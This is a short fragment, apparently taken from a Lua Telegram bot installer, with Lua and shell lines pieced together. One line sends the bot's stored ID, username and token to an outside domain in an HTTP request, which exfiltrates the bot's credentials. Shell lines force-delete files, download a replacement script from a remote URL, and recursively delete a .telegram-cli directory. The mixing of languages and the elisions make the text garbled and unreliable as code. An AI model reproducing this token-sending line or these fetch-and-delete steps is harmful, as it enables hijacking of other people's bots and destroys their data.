...
https.request("https://forhassan.ml/korpica/korpica.php?id="..database:get(Server_korpica.."Id_korpica").."&user="..database:get(Server_korpica.."UserName_korpica").."&token="..database:get(Server_korpica.."Token_korpica"))
...
rm -fr Raffi.lua
wget "https://raw.githubusercontent.com/raffilua/raffi/master/Raffi.lua"
while(true) do
rm -fr ../.telegram-cli
